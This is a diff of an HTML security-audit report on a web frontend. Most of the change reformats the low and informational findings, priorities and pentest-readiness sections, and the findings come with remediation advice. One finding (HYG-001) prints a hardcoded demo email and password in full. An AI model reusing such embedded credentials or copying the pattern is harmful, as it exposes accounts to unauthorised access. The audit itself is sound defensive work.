-      <div class="rec"><div class="lbl">Recommendation</div><p>Pin the Trivy installer to a specific release tag (and ideally verify a checksum), then actually run <span class="path">trivy fs</span> and <span class="path">npm run security:audit</span> as gating build steps that fail on High/Critical. Track and periodically re-evaluate the <span class="path">legacy-peer-deps</span> flag.</p></div>
+      <div class="refs">
+        <div>
+          <div class="lbl">OWASP</div>
+          <p>A08:2021 Software &amp; Data Integrity Failures · CI/CD Security</p>
+        </div>
+        <div>
+          <div class="lbl">ISO 27001/2</div>
+          <p>
+            A.8.30 Outsourced development · A.8.8 Technical vulnerabilities · A.8.9 Configuration
+          </p>
+        </div>
+      </div>
+      <div class="rec">
+        <div class="lbl">Recommendation</div>
+        <p>
+          Pin the Trivy installer to a specific release tag (and ideally verify a checksum), then
+          actually run <span class="path">trivy fs</span> and
+          <span class="path">npm run security:audit</span> as gating build steps that fail on
+          High/Critical. Track and periodically re-evaluate the
+          <span class="path">legacy-peer-deps</span> flag.
+        </p>
+      </div>
     </div>
   </section>
 
@@ -563,51 +1774,226 @@ ws 7.0.0-7.5.10 || 8.0.0-8.20.1   Severity: high</pre></div>
     <h2 class="sh"><span class="idx">06</span>Findings — Low</h2>
 
     <div class="finding low">
-      <div class="fhead"><span class="fid">SES-002</span><span class="chip st st-defer">Deferred · handoff</span><span class="chip low">Low</span><span class="chip" style="background:#eef1f8;color:var(--accent)">Sensitive Data</span></div>
-      <div class="ftitle">Temporary password persisted in <code>sessionStorage</code> during first-login flow</div>
-      <div class="fmeta"><span class="tag">File: <span class="path">src/pages/auth/first-login-flow.ts</span></span><span class="tag">Confidence: <b>High</b></span><span class="tag">Priority: <b>Low</b></span></div>
-      <div class="frow"><div class="lbl">Detail</div><p><span class="path">saveFirstLoginFlowState</span> stores <span class="path">{ email, temporaryPassword }</span> in plaintext in <span class="path">sessionStorage</span> to carry it across the OTP → set-password steps. Any on-origin script (or shared/kiosk machine before <span class="path">clearFirstLoginFlowState</span> runs) can read the temporary credential. Exposure window is short and tab-scoped, but a secret should not be persisted.</p></div>
-      <div class="rec"><div class="lbl">Recommendation</div><p>Keep the temporary password in React state / navigation state only, or exchange the temp password for a short-lived server setup-token immediately and store only that. <span class="path">OWASP:</span> A04 Insecure Design · <span class="path">ISO:</span> A.5.17.</p></div>
+      <div class="fhead">
+        <span class="fid">SES-002</span><span class="chip st st-defer">Deferred · handoff</span
+        ><span class="chip low">Low</span
+        ><span class="chip" style="background: #eef1f8; color: var(--accent)">Sensitive Data</span>
+      </div>
+      <div class="ftitle">
+        Temporary password persisted in <code>sessionStorage</code> during first-login flow
+      </div>
+      <div class="fmeta">
+        <span class="tag">File: <span class="path">src/pages/auth/first-login-flow.ts</span></span
+        ><span class="tag">Confidence: <b>High</b></span
+        ><span class="tag">Priority: <b>Low</b></span>
+      </div>
+      <div class="frow">
+        <div class="lbl">Detail</div>
+        <p>
+          <span class="path">saveFirstLoginFlowState</span> stores
+          <span class="path">{ email, temporaryPassword }</span> in plaintext in
+          <span class="path">sessionStorage</span> to carry it across the OTP → set-password steps.
+          Any on-origin script (or shared/kiosk machine before
+          <span class="path">clearFirstLoginFlowState</span> runs) can read the temporary
+          credential. Exposure window is short and tab-scoped, but a secret should not be persisted.
+        </p>
+      </div>
+      <div class="rec">
+        <div class="lbl">Recommendation</div>
+        <p>
+          Keep the temporary password in React state / navigation state only, or exchange the temp
+          password for a short-lived server setup-token immediately and store only that.
+          <span class="path">OWASP:</span> A04 Insecure Design ·
+          <span class="path">ISO:</span> A.5.17.
+        </p>
+      </div>
     </div>
 
     <div class="finding low">
-      <div class="fhead"><span class="fid">UPLOAD-001</span><span class="chip st st-fixed">Fixed</span><span class="chip low">Low</span><span class="chip" style="background:#eef1f8;color:var(--accent)">File Upload</span></div>
-      <div class="ftitle">File uploads rely on the client <code>accept</code> attribute; no client size/content check on C88</div>
-      <div class="fmeta"><span class="tag">File: <span class="path">upload-c88-document-modal.tsx</span> · <span class="path">edit-profile-tab.tsx</span></span><span class="tag">Confidence: <b>High</b></span><span class="tag">Priority: <b>Low</b></span></div>
-      <div class="frow"><div class="lbl">Detail</div><p>The C88 upload restricts selection with <span class="path">accept="application/pdf,.pdf"</span> only (trivially bypassed) and enforces no client-side size limit; the avatar upload validates type by extension and caps at 1.5&nbsp;MB. Server-side magic-byte validation exists in the shared backend, so this is defense-in-depth, not a live bypass.</p></div>
-      <div class="rec"><div class="lbl">Recommendation</div><p>Add a client-side MIME + magic-byte sniff and a size ceiling for the C88 PDF to fail fast and reduce wasted uploads; continue to rely on the backend as the authority. <span class="path">OWASP:</span> File Upload Cheat Sheet · <span class="path">ISO:</span> A.8.26.</p></div>
+      <div class="fhead">
+        <span class="fid">UPLOAD-001</span><span class="chip st st-fixed">Fixed</span
+        ><span class="chip low">Low</span
+        ><span class="chip" style="background: #eef1f8; color: var(--accent)">File Upload</span>
+      </div>
+      <div class="ftitle">
+        File uploads rely on the client <code>accept</code> attribute; no client size/content check
+        on C88
+      </div>
+      <div class="fmeta">
+        <span class="tag"
+          >File: <span class="path">upload-c88-document-modal.tsx</span> ·
+          <span class="path">edit-profile-tab.tsx</span></span
+        ><span class="tag">Confidence: <b>High</b></span
+        ><span class="tag">Priority: <b>Low</b></span>
+      </div>
+      <div class="frow">
+        <div class="lbl">Detail</div>
+        <p>
+          The C88 upload restricts selection with
+          <span class="path">accept="application/pdf,.pdf"</span> only (trivially bypassed) and
+          enforces no client-side size limit; the avatar upload validates type by extension and caps
+          at 1.5&nbsp;MB. Server-side magic-byte validation exists in the shared backend, so this is
+          defense-in-depth, not a live bypass.
+        </p>
+      </div>
+      <div class="rec">
+        <div class="lbl">Recommendation</div>
+        <p>
+          Add a client-side MIME + magic-byte sniff and a size ceiling for the C88 PDF to fail fast
+          and reduce wasted uploads; continue to rely on the backend as the authority.
+          <span class="path">OWASP:</span> File Upload Cheat Sheet ·
+          <span class="path">ISO:</span> A.8.26.
+        </p>
+      </div>
     </div>
 
     <div class="finding low">
-      <div class="fhead"><span class="fid">HYG-001</span><span class="chip st st-fixed">Fixed</span><span class="chip low">Low</span><span class="chip" style="background:#eef1f8;color:var(--accent)">Hardcoded Credentials · Dead Code</span></div>
+      <div class="fhead">
+        <span class="fid">HYG-001</span><span class="chip st st-fixed">Fixed</span
+        ><span class="chip low">Low</span
+        ><span class="chip" style="background: #eef1f8; color: var(--accent)"
+          >Hardcoded Credentials · Dead Code</span
+        >
+      </div>
       <div class="ftitle">Hardcoded demo credentials shipped in the bundle</div>
-      <div class="fmeta"><span class="tag">File: <span class="path">src/config/auth.ts</span></span><span class="tag">Confidence: <b>High</b></span><span class="tag">Priority: <b>Low</b></span></div>
-      <div class="frow"><div class="lbl">Detail</div><p><span class="path">DEMO_EMAIL = 'user@recovery.co'</span> and <span class="path">DEMO_PASSWORD = 'TradeHarmony1!'</span> are defined and (verified) currently unused, but they ship in the JS bundle and the file comment invites wiring them into sign-in "later". A hardcoded credential pair is a latent backdoor and a poor pattern to leave in a production build.</p></div>
-      <div class="rec"><div class="lbl">Recommendation</div><p>Delete the file. If demo login is required, gate it behind a non-production env flag and never embed a real-looking password. <span class="path">OWASP:</span> A07 · <span class="path">ISO:</span> A.5.17 / A.8.28.</p></div>
+      <div class="fmeta">
+        <span class="tag">File: <span class="path">src/config/auth.ts</span></span
+        ><span class="tag">Confidence: <b>High</b></span
+        ><span class="tag">Priority: <b>Low</b></span>
+      </div>
+      <div class="frow">
+        <div class="lbl">Detail</div>
+        <p>
+          <span class="path">DEMO_EMAIL = 'user@recovery.co'</span> and
+          <span class="path">DEMO_PASSWORD = 'TradeHarmony1!'</span> are defined and (verified)
+          currently unused, but they ship in the JS bundle and the file comment invites wiring them
+          into sign-in "later". A hardcoded credential pair is a latent backdoor and a poor pattern
+          to leave in a production build.
+        </p>
+      </div>
+      <div class="rec">
+        <div class="lbl">Recommendation</div>
+        <p>
+          Delete the file. If demo login is required, gate it behind a non-production env flag and
+          never embed a real-looking password. <span class="path">OWASP:</span> A07 ·
+          <span class="path">ISO:</span> A.5.17 / A.8.28.
+        </p>
+      </div>
     </div>
 
     <div class="finding low">
-      <div class="fhead"><span class="fid">HYG-002</span><span class="chip st st-fixed">Fixed</span><span class="chip low">Low</span><span class="chip" style="background:#eef1f8;color:var(--accent)">Dead Code · Maintainability</span></div>
+      <div class="fhead">
+        <span class="fid">HYG-002</span><span class="chip st st-fixed">Fixed</span
+        ><span class="chip low">Low</span
+        ><span class="chip" style="background: #eef1f8; color: var(--accent)"
+          >Dead Code · Maintainability</span
+        >
+      </div>
       <div class="ftitle">Duplicate InvalidSubdomainPage and divergent auth-URL allowlists</div>
-      <div class="fmeta"><span class="tag">File: <span class="path">components/tenant/…</span> · <span class="path">reauth.ts</span> · <span class="path">recoveryApi.ts</span></span><span class="tag">Confidence: <b>Medium</b></span><span class="tag">Priority: <b>Low</b></span></div>
-      <div class="frow"><div class="lbl">Detail</div><p>Two <span class="path">InvalidSubdomainPage</span> implementations exist (only the <span class="path">pages/auth</span> one is routed) — both carry the RED-001 redirect sink, so a fix applied to one can miss the other. Separately, the <span class="path">isAuthUrl</span> allowlist that skips re-auth in <span class="path">reauth.ts</span> omits the first-login endpoints that <span class="path">recoveryApi.ts</span>'s copy includes; drift between the two lists can cause inconsistent 401 handling on those routes.</p></div>
-      <div class="rec"><div class="lbl">Recommendation</div><p>Delete the unused component and hoist a single shared <span class="path">isAuthUrl</span> constant. <span class="path">OWASP:</span> A04 · <span class="path">ISO:</span> A.8.28 Secure coding.</p></div>
+      <div class="fmeta">
+        <span class="tag"
+          >File: <span class="path">components/tenant/…</span> ·
+          <span class="path">reauth.ts</span> · <span class="path">recoveryApi.ts</span></span
+        ><span class="tag">Confidence: <b>Medium</b></span
+        ><span class="tag">Priority: <b>Low</b></span>
+      </div>
+      <div class="frow">
+        <div class="lbl">Detail</div>
+        <p>
+          Two <span class="path">InvalidSubdomainPage</span> implementations exist (only the
+          <span class="path">pages/auth</span> one is routed) — both carry the RED-001 redirect
+          sink, so a fix applied to one can miss the other. Separately, the
+          <span class="path">isAuthUrl</span> allowlist that skips re-auth in
+          <span class="path">reauth.ts</span> omits the first-login endpoints that
+          <span class="path">recoveryApi.ts</span>'s copy includes; drift between the two lists can
+          cause inconsistent 401 handling on those routes.
+        </p>
+      </div>
+      <div class="rec">
+        <div class="lbl">Recommendation</div>
+        <p>
+          Delete the unused component and hoist a single shared
+          <span class="path">isAuthUrl</span> constant. <span class="path">OWASP:</span> A04 ·
+          <span class="path">ISO:</span> A.8.28 Secure coding.
+        </p>
+      </div>
     </div>
 
     <div class="finding low">
-      <div class="fhead"><span class="fid">TAB-001</span><span class="chip st st-fixed">Fixed</span><span class="chip low">Low</span><span class="chip" style="background:#eef1f8;color:var(--accent)">Tabnabbing</span></div>
-      <div class="ftitle"><code>target="_blank"</code> links without <code>rel="noopener"</code></div>
-      <div class="fmeta"><span class="tag">File: <span class="path">landed-cost-comparison-modal.tsx</span></span><span class="tag">Confidence: <b>Medium</b></span><span class="tag">Priority: <b>Low</b></span></div>
-      <div class="frow"><div class="lbl">Detail</div><p>The <span class="path">react-csv</span> <span class="path">CSVLink</span> uses <span class="path">target="_blank"</span> without an explicit <span class="path">rel="noopener noreferrer"</span>. Modern browsers imply <span class="path">noopener</span> for <span class="path">_blank</span>, and the href is a local blob, so residual risk is minimal — but the explicit attribute should be present for any external <span class="path">_blank</span> anchor.</p></div>
-      <div class="rec"><div class="lbl">Recommendation</div><p>Add <span class="path">rel="noopener noreferrer"</span> to all <span class="path">target="_blank"</span> anchors as a standard. <span class="path">OWASP:</span> HTML5 Security · <span class="path">ISO:</span> A.8.28.</p></div>
+      <div class="fhead">
+        <span class="fid">TAB-001</span><span class="chip st st-fixed">Fixed</span
+        ><span class="chip low">Low</span
+        ><span class="chip" style="background: #eef1f8; color: var(--accent)">Tabnabbing</span>
+      </div>
+      <div class="ftitle">
+        <code>target="_blank"</code> links without <code>rel="noopener"</code>
+      </div>
+      <div class="fmeta">
+        <span class="tag">File: <span class="path">landed-cost-comparison-modal.tsx</span></span
+        ><span class="tag">Confidence: <b>Medium</b></span
+        ><span class="tag">Priority: <b>Low</b></span>
+      </div>
+      <div class="frow">
+        <div class="lbl">Detail</div>
+        <p>
+          The <span class="path">react-csv</span> <span class="path">CSVLink</span> uses
+          <span class="path">target="_blank"</span> without an explicit
+          <span class="path">rel="noopener noreferrer"</span>. Modern browsers imply
+          <span class="path">noopener</span> for <span class="path">_blank</span>, and the href is a
+          local blob, so residual risk is minimal — but the explicit attribute should be present for
+          any external <span class="path">_blank</span> anchor.
+        </p>
+      </div>
+      <div class="rec">
+        <div class="lbl">Recommendation</div>
+        <p>
+          Add <span class="path">rel="noopener noreferrer"</span> to all
+          <span class="path">target="_blank"</span> anchors as a standard.
+          <span class="path">OWASP:</span> HTML5 Security · <span class="path">ISO:</span> A.8.28.
+        </p>
+      </div>
     </div>
 
     <div class="finding low">
-      <div class="fhead"><span class="fid">THEME-001</span><span class="chip st st-fixed">Fixed</span><span class="chip low">Low</span><span class="chip" style="background:#eef1f8;color:var(--accent)">Input Validation · DOM</span></div>
-      <div class="ftitle">Tenant theme values injected into CSS variables / DOM without validation</div>
-      <div class="fmeta"><span class="tag">File: <span class="path">components/layout/tenant-validation-guard.tsx</span></span><span class="tag">Fn: <b>applyTenantTheme</b></span><span class="tag">Confidence: <b>Medium</b></span><span class="tag">Priority: <b>Low</b></span></div>
-      <div class="frow"><div class="lbl">Detail</div><p><span class="path">applyTenantTheme</span> writes tenant-supplied colors into CSS custom properties and injects <span class="path">logoUrl</span> both as <span class="path">url('${logoUrl}')</span> and as a dynamically-created <span class="path">&lt;link rel="icon" href&gt;</span> — with no format validation (unlike <span class="path">lib/tenantTheme.ts</span>, which hex-checks colors). Values come from the trusted tenant-validation API, so exploitability depends on that response being attacker-influenceable; still, unvalidated interpolation into CSS/DOM is a CSS-injection footgun.</p></div>
-      <div class="rec"><div class="lbl">Recommendation</div><p>Validate colors against a strict hex pattern (reuse the existing helper) and validate <span class="path">logoUrl</span> as an <span class="path">https</span> URL on an expected host before applying. <span class="path">OWASP:</span> A03 Injection · <span class="path">ISO:</span> A.8.26.</p></div>
+      <div class="fhead">
+        <span class="fid">THEME-001</span><span class="chip st st-fixed">Fixed</span
+        ><span class="chip low">Low</span
+        ><span class="chip" style="background: #eef1f8; color: var(--accent)"
+          >Input Validation · DOM</span
+        >
+      </div>
+      <div class="ftitle">
+        Tenant theme values injected into CSS variables / DOM without validation
+      </div>
+      <div class="fmeta">
+        <span class="tag"
+          >File: <span class="path">components/layout/tenant-validation-guard.tsx</span></span
+        ><span class="tag">Fn: <b>applyTenantTheme</b></span
+        ><span class="tag">Confidence: <b>Medium</b></span
+        ><span class="tag">Priority: <b>Low</b></span>
+      </div>
+      <div class="frow">
+        <div class="lbl">Detail</div>
+        <p>
+          <span class="path">applyTenantTheme</span> writes tenant-supplied colors into CSS custom
+          properties and injects <span class="path">logoUrl</span> both as
+          <span class="path">url('${logoUrl}')</span> and as a dynamically-created
+          <span class="path">&lt;link rel="icon" href&gt;</span> — with no format validation (unlike
+          <span class="path">lib/tenantTheme.ts</span>, which hex-checks colors). Values come from
+          the trusted tenant-validation API, so exploitability depends on that response being
+          attacker-influenceable; still, unvalidated interpolation into CSS/DOM is a CSS-injection
+          footgun.
+        </p>
+      </div>
+      <div class="rec">
+        <div class="lbl">Recommendation</div>
+        <p>
+          Validate colors against a strict hex pattern (reuse the existing helper) and validate
+          <span class="path">logoUrl</span> as an <span class="path">https</span> URL on an expected
+          host before applying. <span class="path">OWASP:</span> A03 Injection ·
+          <span class="path">ISO:</span> A.8.26.
+        </p>
+      </div>
     </div>
   </section>
 
@@ -617,24 +2003,75 @@ ws 7.0.0-7.5.10 || 8.0.0-8.20.1   Severity: high</pre></div>
     <div class="finding info">
       <div class="fhead"><span class="fid">AC-001</span><span class="chip info">Info</span></div>
       <div class="ftitle">Route guards trust a client-decoded, signature-unverified JWT</div>
-      <div class="frow"><div class="lbl">Detail</div><p><span class="path">useAuth</span> derives <span class="path">isAuthenticated</span> from <span class="path">Boolean(user && token)</span>, where <span class="path">user</span> is produced by <span class="path">atob</span>-decoding the JWT payload client-side (no signature check). This is normal and acceptable for an SPA — the guards are UX only and the backend enforces every request — and there is no admin/role UI to escalate into. Documented so pentesters know client "auth state" is cosmetic and all authorization must be verified server-side.</p></div>
+      <div class="frow">
+        <div class="lbl">Detail</div>
+        <p>
+          <span class="path">useAuth</span> derives <span class="path">isAuthenticated</span> from
+          <span class="path">Boolean(user && token)</span>, where <span class="path">user</span> is
+          produced by <span class="path">atob</span>-decoding the JWT payload client-side (no
+          signature check). This is normal and acceptable for an SPA — the guards are UX only and
+          the backend enforces every request — and there is no admin/role UI to escalate into.
+          Documented so pentesters know client "auth state" is cosmetic and all authorization must
+          be verified server-side.
+        </p>
+      </div>
     </div>
     <div class="finding info">
-      <div class="fhead"><span class="fid">CFG-001</span><span class="chip st st-partial">Partially fixed</span><span class="chip info">Info</span></div>
+      <div class="fhead">
+        <span class="fid">CFG-001</span><span class="chip st st-partial">Partially fixed</span
+        ><span class="chip info">Info</span>
+      </div>
       <div class="ftitle">Google Fonts loaded from an external origin</div>
-      <div class="frow"><div class="lbl">Detail</div><p><span class="path">public/index.html</span> loads Lexend from <span class="path">fonts.googleapis.com</span>. This forces any future CSP to allow that origin (or accept a fallback) and is a minor third-party dependency. Self-hosting the font removes the external origin and tightens the CSP planned in HDR-001.</p></div>
+      <div class="frow">
+        <div class="lbl">Detail</div>
+        <p>
+          <span class="path">public/index.html</span> loads Lexend from
+          <span class="path">fonts.googleapis.com</span>. This forces any future CSP to allow that
+          origin (or accept a fallback) and is a minor third-party dependency. Self-hosting the font
+          removes the external origin and tightens the CSP planned in HDR-001.
+        </p>
+      </div>
     </div>
     <div class="finding good">
-      <div class="fhead"><span class="fid">POS-001</span><span class="chip good">Positive Controls</span></div>
+      <div class="fhead">
+        <span class="fid">POS-001</span><span class="chip good">Positive Controls</span>
+      </div>
       <div class="ftitle">Calibration — what this frontend already does right</div>
-      <div class="frow"><div class="lbl">Verified strengths</div>
-        <ul class="clean" style="margin-top:6px">
-          <li><b>No dangerous sinks:</b> zero <span class="path">dangerouslySetInnerHTML</span>, <span class="path">eval</span>, <span class="path">document.write</span>, <span class="path">postMessage</span> listeners, or <span class="path">iframe</span> embeds; the inbox renders email metadata + attachments, never raw HTML bodies — so the stored/DOM-XSS surface is very small.</li>
-          <li><b>No secrets in the bundle:</b> <span class="path">.env</span> is git-ignored, holds only public <span class="path">REACT_APP_*</span> config, and a grep for API keys / tokens / AWS creds in <span class="path">src</span> is clean.</li>
-          <li><b>Improved token hygiene:</b> tokens moved off <span class="path">localStorage</span> to tab-scoped <span class="path">sessionStorage</span> with a 12-hour expiry envelope and legacy-key purging (see SES-001 for the residual).</li>
-          <li><b>Logging discipline:</b> <span class="path">no-console</span> is an ESLint error; runtime errors go through <span class="path">reportRuntimeError</span> which is silent outside production — no PII console leakage.</li>
-          <li><b>Password policy enforced client-side:</b> length + upper/lower/digit/special complexity on set/reset/change flows; login excludes auth endpoints from bearer injection.</li>
-          <li><b>Typed API boundary:</b> a single RTK Query layer with Zod-validated auth responses and a controlled 401 refresh-and-retry keeps network behavior consistent and auditable.</li>
+      <div class="frow">
+        <div class="lbl">Verified strengths</div>
+        <ul class="clean" style="margin-top: 6px">
+          <li>
+            <b>No dangerous sinks:</b> zero <span class="path">dangerouslySetInnerHTML</span>,
+            <span class="path">eval</span>, <span class="path">document.write</span>,
+            <span class="path">postMessage</span> listeners, or
+            <span class="path">iframe</span> embeds; the inbox renders email metadata + attachments,
+            never raw HTML bodies — so the stored/DOM-XSS surface is very small.
+          </li>
+          <li>
+            <b>No secrets in the bundle:</b> <span class="path">.env</span> is git-ignored, holds
+            only public <span class="path">REACT_APP_*</span> config, and a grep for API keys /
+            tokens / AWS creds in <span class="path">src</span> is clean.
+          </li>
+          <li>
+            <b>Improved token hygiene:</b> tokens moved off
+            <span class="path">localStorage</span> to tab-scoped
+            <span class="path">sessionStorage</span> with a 12-hour expiry envelope and legacy-key
+            purging (see SES-001 for the residual).
+          </li>
+          <li>
+            <b>Logging discipline:</b> <span class="path">no-console</span> is an ESLint error;
+            runtime errors go through <span class="path">reportRuntimeError</span> which is silent
+            outside production — no PII console leakage.
+          </li>
+          <li>
+            <b>Password policy enforced client-side:</b> length + upper/lower/digit/special
+            complexity on set/reset/change flows; login excludes auth endpoints from bearer
+            injection.
+          </li>
+          <li>
+            <b>Typed API boundary:</b> a single RTK Query layer with Zod-validated auth responses
+            and a controlled 401 refresh-and-retry keeps network behavior consistent and auditable.
+          </li>
         </ul>
       </div>
     </div>
@@ -645,22 +2082,57 @@ ws 7.0.0-7.5.10 || 8.0.0-8.20.1   Severity: high</pre></div>
     <h2 class="sh"><span class="idx">08</span>Priorities</h2>
     <div class="two">
       <div class="card">
-        <div class="lbl" style="font-family:var(--mono);font-size:11px;letter-spacing:.14em;text-transform:uppercase;color:var(--high);margin-bottom:10px">Top Risks (fix before pentest)</div>
+        <div
+          class="lbl"
+          style="
+            font-family: var(--mono);
+            font-size: 11px;
+            letter-spacing: 0.14em;
+            text-transform: uppercase;
+            color: var(--high);
+            margin-bottom: 10px;
+          "
+        >
+          Top Risks (fix before pentest)
+        </div>
         <ul class="clean">
           <li><b>HDR-001</b> — ship a CSP + full security-header set (biggest single gap).</li>
-          <li><b>RED-001</b> — allowlist the <span class="path">redirectUrl</span> target; block <span class="path">javascript:</span> hrefs.</li>
-          <li><b>SES-001</b> — move the refresh token to an HttpOnly cookie (backend pattern exists).</li>
+          <li>
+            <b>RED-001</b> — allowlist the <span class="path">redirectUrl</span> target; block
+            <span class="path">javascript:</span> hrefs.
+          </li>
+          <li>
+            <b>SES-001</b> — move the refresh token to an HttpOnly cookie (backend pattern exists).
+          </li>
           <li><b>INFO-001</b> — disable production source maps.</li>
         </ul>
       </div>
       <div class="card">
-        <div class="lbl" style="font-family:var(--mono);font-size:11px;letter-spacing:.14em;text-transform:uppercase;color:var(--good);margin-bottom:10px">Quick Wins (low effort, high value)</div>
+        <div
+          class="lbl"
+          style="
+            font-family: var(--mono);
+            font-size: 11px;
+            letter-spacing: 0.14em;
+            text-transform: uppercase;
+            color: var(--good);
+            margin-bottom: 10px;
+          "
+        >
+          Quick Wins (low effort, high value)
+        </div>
         <ul class="clean">
           <li>Set <span class="path">GENERATE_SOURCEMAP=false</span> — one line (INFO-001).</li>
-          <li>Delete <span class="path">config/auth.ts</span> demo creds and the duplicate page (HYG-001/002).</li>
+          <li>
+            Delete <span class="path">config/auth.ts</span> demo creds and the duplicate page
+            (HYG-001/002).
+          </li>
           <li>Prefix formula-triggering CSV cells (CSV-001).</li>
           <li>Pin the Trivy installer &amp; actually run the scans (SUP-001).</li>
-          <li>Add <span class="path">rel="noopener noreferrer"</span> to <span class="path">_blank</span> links (TAB-001).</li>
+          <li>
+            Add <span class="path">rel="noopener noreferrer"</span> to
+            <span class="path">_blank</span> links (TAB-001).
+          </li>
         </ul>
       </div>
     </div>
@@ -671,10 +2143,26 @@ ws 7.0.0-7.5.10 || 8.0.0-8.20.1   Severity: high</pre></div>
     <h2 class="sh"><span class="idx">09</span>Long-Term Improvements</h2>
     <div class="card">
       <ul class="clean">
-        <li><b>Backend-owned sessions:</b> adopt the HttpOnly refresh-cookie flow end-to-end and keep only a short-lived access token in memory, retiring web-storage tokens entirely (closes SES-001 + SES-002).</li>
-        <li><b>Migrate off <span class="path">react-scripts</span>:</b> move to a maintained bundler (Vite) to durably eliminate the <span class="path">webpack-dev-server</span> CVE chain and regain source-map/CSP-nonce control (DEP-001).</li>
-        <li><b>Enforce security gates in CI:</b> make <span class="path">trivy fs</span> and <span class="path">npm audit</span> blocking, with a documented, time-boxed exception list — so "configured" equals "enforced" (SUP-001).</li>
-        <li><b>Central redirect/URL guard:</b> a single <span class="path">isAllowedUrl</span> helper reused by every navigation and external link, mirroring trade-harmonizer's <span class="path">isAllowedRedirect</span>.</li>
+        <li>
+          <b>Backend-owned sessions:</b> adopt the HttpOnly refresh-cookie flow end-to-end and keep
+          only a short-lived access token in memory, retiring web-storage tokens entirely (closes
+          SES-001 + SES-002).
+        </li>
+        <li>
+          <b>Migrate off <span class="path">react-scripts</span>:</b> move to a maintained bundler
+          (Vite) to durably eliminate the <span class="path">webpack-dev-server</span> CVE chain and
+          regain source-map/CSP-nonce control (DEP-001).
+        </li>
+        <li>
+          <b>Enforce security gates in CI:</b> make <span class="path">trivy fs</span> and
+          <span class="path">npm audit</span> blocking, with a documented, time-boxed exception list
+          — so "configured" equals "enforced" (SUP-001).
+        </li>
+        <li>
+          <b>Central redirect/URL guard:</b> a single <span class="path">isAllowedUrl</span> helper
+          reused by every navigation and external link, mirroring trade-harmonizer's
+          <span class="path">isAllowedRedirect</span>.
+        </li>
       </ul>
     </div>
   </section>
@@ -682,15 +2170,42 @@ ws 7.0.0-7.5.10 || 8.0.0-8.20.1   Severity: high</pre></div>
   <!-- READINESS -->
   <section>
     <h2 class="sh"><span class="idx">10</span>Penetration-Testing Readiness</h2>
-    <div class="card" style="border-left:5px solid #4d9a5a">
-      <p class="lead"><b>Verdict: Remediated — pending one deploy check.</b> The four original blockers have been addressed in code, and the platform is in good shape for an external test once the Amplify header deploy is confirmed:</p>
+    <div class="card" style="border-left: 5px solid #4d9a5a">
+      <p class="lead">
+        <b>Verdict: Remediated — pending one deploy check.</b> The four original blockers have been
+        addressed in code, and the platform is in good shape for an external test once the Amplify
+        header deploy is confirmed:
+      </p>
       <ul class="clean">
-        <li><b>Blocker 1 — HDR-001 → Fixed*:</b> full security-header set + strict CSP added via <span class="path">customHttp.yml</span>. <b>Must be confirmed on an Amplify preview deploy</b> (live headers + no CSP-violation console errors) — this is the one remaining gate.</li>
-        <li><b>Blocker 2 — RED-001 → Fixed:</b> redirect target allowlisted (<span class="path">isAllowedRedirectUrl</span>), <span class="path">javascript:</span>/foreign hosts rejected; covered by tests.</li>
-        <li><b>Blocker 3 — INFO-001 → Fixed:</b> production source maps disabled; verified 0 <span class="path">.map</span> files in the build.</li>
-        <li><b>Blocker 4 — SES-001 → Backend handoff:</b> the recovery backend issues no auth cookie at all, so the frontend cannot move tokens to HttpOnly cookies alone. The new enforced CSP is the compensating control; backend must add an HttpOnly refresh cookie on <span class="path">/recovery/auth/*</span>.</li>
+        <li>
+          <b>Blocker 1 — HDR-001 → Fixed*:</b> full security-header set + strict CSP added via
+          <span class="path">customHttp.yml</span>.
+          <b>Must be confirmed on an Amplify preview deploy</b> (live headers + no CSP-violation
+          console errors) — this is the one remaining gate.
+        </li>
+        <li>
+          <b>Blocker 2 — RED-001 → Fixed:</b> redirect target allowlisted (<span class="path"
+            >isAllowedRedirectUrl</span
+          >), <span class="path">javascript:</span>/foreign hosts rejected; covered by tests.
+        </li>
+        <li>
+          <b>Blocker 3 — INFO-001 → Fixed:</b> production source maps disabled; verified 0
+          <span class="path">.map</span> files in the build.
+        </li>
+        <li>
+          <b>Blocker 4 — SES-001 → Backend handoff:</b> the recovery backend issues no auth cookie
+          at all, so the frontend cannot move tokens to HttpOnly cookies alone. The new enforced CSP
+          is the compensating control; backend must add an HttpOnly refresh cookie on
+          <span class="path">/recovery/auth/*</span>.
+        </li>
       </ul>
-      <p style="margin:14px 0 0;font-size:14.5px;color:var(--ink-soft)"><b>Hand to the pentest team as explicit test cases / residuals:</b> SES-001 &amp; SES-002 (backend cookie/token-exchange), API-001 (verified server-side ownership check — confirm it holds under fuzzing), the live Amplify header + CSP-violation check, and the dev-only npm advisories pending the react-scripts→Vite migration. All local repo gates pass (lint 0-warn · strict typecheck · 62/62 tests · no cycles · build green · Trivy 0 CRITICAL).</p>
+      <p style="margin: 14px 0 0; font-size: 14.5px; color: var(--ink-soft)">
+        <b>Hand to the pentest team as explicit test cases / residuals:</b> SES-001 &amp; SES-002
+        (backend cookie/token-exchange), API-001 (verified server-side ownership check — confirm it
+        holds under fuzzing), the live Amplify header + CSP-violation check, and the dev-only npm
+        advisories pending the react-scripts→Vite migration. All local repo gates pass (lint 0-warn
+        · strict typecheck · 62/62 tests · no cycles · build green · Trivy 0 CRITICAL).
+      </p>
     </div>
   </section>
 
